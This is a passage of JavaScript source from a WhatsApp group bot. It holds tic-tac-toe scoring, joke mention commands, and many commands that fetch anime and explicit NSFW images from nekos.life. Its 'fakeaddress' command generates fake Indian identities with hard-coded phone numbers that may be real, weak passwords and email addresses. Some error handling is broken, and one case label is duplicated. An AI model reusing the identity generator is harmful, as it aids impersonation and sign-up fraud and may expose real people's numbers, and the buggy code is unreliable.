if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isLevelingOn) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0
addLevelingXp(tttset.player, randomTTTXP)
break
}	
tiringa.sendMessage(from, `🎉🎉 Walker-BOT VICTORY 🎉🎉\n\n➣  PUNISHMENT: ${randomTTTXP} XP 🔮`, text)
} else {
tiringa.sendMessage(from, `🎉🎉 Walker-BOT VICTORY 🎉🎉`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isLevelingOn) {
tiringa.sendMessage(from, `🎉🎉 TIE 🎉🎉\n\n➣  THERE IS NO GAIN OR LOSS`, text)
} else {
tiringa.sendMessage(from, `🎉🎉 TIE 🎉🎉`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break

				case 'ttt3':
                    if (fs.existsSync(`./ArifiSrc/tictactoe/${from}.json`)) {
                         const boardnow = setGame(`${from}`);
                         const matrix = boardnow._matrix;
                         const chatMove = `*🎳 Tictactoe Game 🎲*
     
     There is currently a Group Games session ini\n\n@${boardnow.X} VS @${boardnow.O}
     
     ❌ : @${boardnow.X}
     ⭕ : @${boardnow.O}
     
     Giliran : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
     
          ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
          ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
          ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
     
     
     `;
                         tiringa.sendMessage(from, chatMove, MessageType.text, {
                              quoted: MythicXbot,
                              contextInfo: {
                                   mentionedJid: [
                                        boardnow.X + "@s.whatsapp.net",
                                        boardnow.O + "@s.whatsapp.net",
                                   ],
                              },
                         });
                         return;
                    }
                    if (args.length === 1)
                         return reply(
                              `❗The tag you want to be your opponent!\n\n✅Use : *${prefix}ttt3 [@TagMember]*\nEnjoy Playing the Tictactoe Game🎳`
                         );
                    const boardnow = setGame(`${from}`);
                    console.log(`🎲Start Tictactoe ${boardnow.session}`);
                    boardnow.status = false;
                    boardnow.X = sender.replace("@s.whatsapp.net", "");
                    boardnow.O = args[1].replace("@", "");
                    fs.writeFileSync(
                         `./ArifiSrc/tictactoe/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const strChat = `*🎳 Starting the Tictactoe Game 🎲*
     
     @${sender.replace(
                         "@s.whatsapp.net",
                         ""
                    )} 🔥Challenge you to become a game opponent🔥
     
     _[ ${args[1]} ] Type Y/N to accept or reject the game_ \n\nGood luck
     `;
                    tiringa.sendMessage(from, strChat, MessageType.text, {
                         quoted: MythicXbot,
                         contextInfo: {
                              mentionedJid: [sender, args[1].replace("@", "") + "@s.whatsapp.net"],
                         },
                    });
                    break
//_FIM DO JOGO DA VELHA By: Resen
					
case 'amongus':
msgFilter.isFiltered(from)
if (!isGroup) return reply(ptbr.group())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('You need to mention someone')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus = 
`.      　。　　　　•　    　ﾟ　　。
　　.　　　.　　　  　　.　　　　　。　　   。　.
　.　　      。　        ඞ   。　    .    •
•            @${mentioned[0].split('@')[0]} was E j e c t e d
                  1 impostor remain   。　.
　 　　。　　 　　　　ﾟ　　　.　      　　　.
,　　　　.                  .`
//  tiringa.groupRemove(from, mentioned)
mentions(`${sus}`, mentioned, true)
break

case 'hug':
msgFilter.isFiltered(from)
if (!isGroup) return reply(ptbr.group())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
yhb = `How cute... @${sender.split("@")[0]} gave a tight hug in @${mentioned[0].split('@')[0]}`
mentions(yhb, yhb, true)
break

case 'shipp':
msgFilter.isFiltered(from)
if (!isGroup) return reply(ptbr.group())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
porc = `${Math.floor(Math.random() * 100)}`
yhb =  `@${mentioned[0].split('@')[0]} have a chance to ${porc}% to date @${mentioned[1].split('@')[0]}`,
mentions(`${yhb}`, mentioned, true, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break
//mini games, rate, random


//_COMANDOS ANIME
case 'why':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/why`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error has occurred❌\n\nTry again. ')
}
break

case 'spoiler':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/spoiler`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'owoify':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/owoify`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'name':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/name`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'kemonomimi':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'gecg':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/gecg`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'cuddle':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/cuddle`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'kiss':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/kiss`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'keta':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/keta`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'yuri':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/yuri`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
case 'foxg':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/fox_girl`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
case 'fakeaddress':
case 'ra':
case 'randomaddress':

msgFilter.isFiltered(from)
const fnamex = ["ARUN","DEV","ABIN","SAFWAN","PACHU","BIBIN","THORSER","UMMER","RAHUL","MOHAMMED","SANJU","GIRLc"]
const fnamecd = ["01","02","03","04","05","06","07","08","09","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28"]
const fnamecm = ["January","February","March","April","May","June","July","August","September","October","November","December"]
const fnamecy = ["0","1","2","3","4","5","6","7","8","9"]
const fnamewwe = ["1960","1961","1962","1963","1964","1965","1966","1967","1968","1969","1970","1971","1972","1973","1974","1975","1976","1977","1978","1979","1980","1981","1982","1983","1984","1985","1986","1987","1988","1989","1990","1991","1992","1993","1994","1995","1996","1997","1998","1999","1950","1951","1952","1953","1954","1955","1956","1957","1958","1959","2000","2001","2002","2003","2004","2005","2006","2007","2008","2009","2010"]
const fnamev = ["Alappuzha-Alappuzha","Kottayam-Kottayam","Palakkad-Palakkad","Manjeri-Malappuram","Thalassery-Kannur","Thrippunithura-Ernakulam","Ponnani-Malappuram","Vatakara-Kozhikode","Kanhangad-Kasaragod","Payyanur-Kannur","Koyilandy-Kozhikode","Kodungallur-Thrissur","Parappanangadi-Malappuram","Kalamassery-Ernakulam","Neyyattinkara-Thiruvananthapuram","Guruvayur-Thrissur","Tanur-Malappuram","Kayamkulam-Alappuzha","Malappuram-Malappuram","Thrikkakkara-Ernakulam","Wadakkancherry-Thrissur","Irinjalakuda-Thrissur","Nedumangad-Thiruvananthapuram"]
const fnamen = ["budda","peace","null"]
const fnameiyo = ["9771395046","2767021510","1196689910","4441123076","3360785790","3557433989","1566125872","5822645679","2274449871","2112306408","4906726272","1833114802","8678866660","3061202424","2235616992","2459724555","6452623548","5567777797","6110734391","8169815080","7258492196","1787822244","5542177851","3352920062","3239508783","8055251367","9174115189","6223572498","5872628996","2604315831","5613352936","7467890863","8758650459","0493850325","4996223649","3920404292","7629827097","8109543544","5086081150","6883787313","2672936838","5432389115","6801496974","5885635135","3156711364","4625033108","8748947770","2019668766","8758714255","9593193222","2908035426","7435894268","6836447111","6725657578","8218941911","7848002478","1654254570","6661209630","1813962650","1191888816","1983840622","1102402386","9733928721","4241135157","4770065151","1321903745","4986885386","8906465048","6184168605","3535663304","9047810213","7890197462","9246407255","5208667751","4663860263","4087292692","7863046699","3420346856","4368647122","7659776853","9130069978","8827651971","1988038108","8992509218","7323401235","4751564481","6009494234","0535823807","7021736274","9480736333","4443198300","9470235150","8991258962","2131833146","0916878911","1082745839","3926383234","8670586342","9468309084","5574463524"]
const fnamexc = ["KKIP","GOKU","XC","TY","HW"]
const fnamezz = ["617","407","956","272","801","197","767","941","154","185","706","332","358","401","871","596","548","485","586","821","925","910","471","453","176","320","153","881","601","389","887","523","615","543","142","151","480","648","789","363","256","247","158","691","757","472","209","491","403","343","186","408","346","977","491","494","756","800","760","958","612","924","389","425","675","687","796","156","473","468","317","520","696","730","545","934","274","970","780","229","962","965","868","291","822","922","794","814","462","941","757","550","286","743","654","694","947","773","405","225"]
fake2m = fnamecm[Math.floor(Math.random() * fnamecm.length)]
fake2d = fnamecd[Math.floor(Math.random() * fnamecd.length)]
fake1 = fnamex[Math.floor(Math.random() * fnamex.length)]
fake2y = fnamecy[Math.floor(Math.random() * fnamecy.length)]
fake2yn = fnamewwe[Math.floor(Math.random() * fnamewwe.length)]
fake3 = fnamev[Math.floor(Math.random() * fnamev.length)]
fake5 = fnamen[Math.floor(Math.random() * fnamen.length)]
const fnameio = ["💰","🏖️","🌄","🔬","🎭","👑","🍄","🐎","🎂"]
fake7 = fnameio[Math.floor(Math.random() * fnameio.length)]
fake8 = fnameiyo[Math.floor(Math.random() * fnameiyo.length)]
fake11 = fnamexc[Math.floor(Math.random() * fnamexc.length)]
fakez = fnamezz[Math.floor(Math.random() * fnamezz.length)]
fakeadd =`╔══════════════
║${fake7}${fake7}${fake7}${fake7}${fake7}${fake7}
║ *➮ɴᴀᴍᴇ:* ${fake1}
║ *➮ʙɪʀᴛʜᴅᴀʏ:* ${fake2d}/${fake2m}/${fake2yn}
║ *➮ᴀᴅᴅʀᴇss:* ${fake3}
║ *➮ᴄɪᴛʏ:* ${fake3}
║ *➮ʀᴇɢɪᴏɴ:* ${fake5}
║ *➮ᴄᴏᴜɴᴛʀʏ:* INDIA🇮🇳
║ *➮ᴢɪᴘᴄᴏᴅᴇ:* 6700${fakez}
║ *➮ɴᴜᴍʙᴇʀ:* +91${fake8}
║ *➮ᴜsᴇʀɴᴀᴍᴇ:* ${fake1}${fake2y}
║ *➮ᴘᴀssᴡᴏʀᴅ:* ${fake1}${fake2y}${fake2y}${fake2y}${fake2y}
║ *➮ᴇᴍᴀɪʟ:* ${fake1}${fake11}${fake2yn}@gmail.com
╚══════════════╝`
				tiringa.sendMessage(from, fakeadd, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
				break
case 'pat':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/pat`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
case 'poke':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/poke`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
case 'waifukawai':
try {
reply(ptbr.wait())
axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then((res)=>{
imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
tiringa.sendMessage(from, buf, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek,caption: "KAWAII!!"})
})})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('an error has occurred')
}
break
		
case 'kemonomimi':
try {
reply(ptbr.wait())
axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then((res)=>{
imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
tiringa.sendMessage(from, buf, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('an error has occurred')
}
break
		
case 'kuni':
try {
reply(ptbr.wait())
axios.get(`https://nekos.life/api/v2/img/kuni`).then((res)=>{
imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
tiringa.sendMessage(from, buf, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('an error has occurred')
}
break 
case 'tickle':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/tickle`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
case 'random':
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
try {  
hah = await fetchJson(`https://freerestapi.herokuapp.com/api/v1/randomp`)
hehe = await getBuffer(hah.url)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
    case 'waifu':
try {
reply(ptbr.wait())
axios.get('https://nekos.life/api/v2/img/waifu').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

 case 'animeavatar':
 try {
 reply(ptbr.wait())
axios.get('https://nekos.life/api/v2/img/avatar').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
                      
case 'wallpaper2':
try {
reply(ptbr.wait())
axios.get('https://akaneko-api.herokuapp.com/api/wallpapers').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
                
case 'baka':
try {
reply(ptbr.wait())
axios.get('https://nekos.life/api/v2/img/baka').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break   

//_COMANDOS NSFW
case 'holo':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/holo`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

//GIF
case 'smug':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/smug`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'solo':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/solo`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'ero':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/ero`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'erofeet':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/erofeet`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'spank':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/spank`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'feet':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/feet`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'classic':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/classic`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'holoero':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/holoero`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'cum':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/cum_jpg`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'eroyuri':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/eroyuri`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'eron':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/eron`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'pwankg':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/pwankg`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'anal':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/anal`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'lewd':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/lewd`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'lewdkemo':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/lewdkemo`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

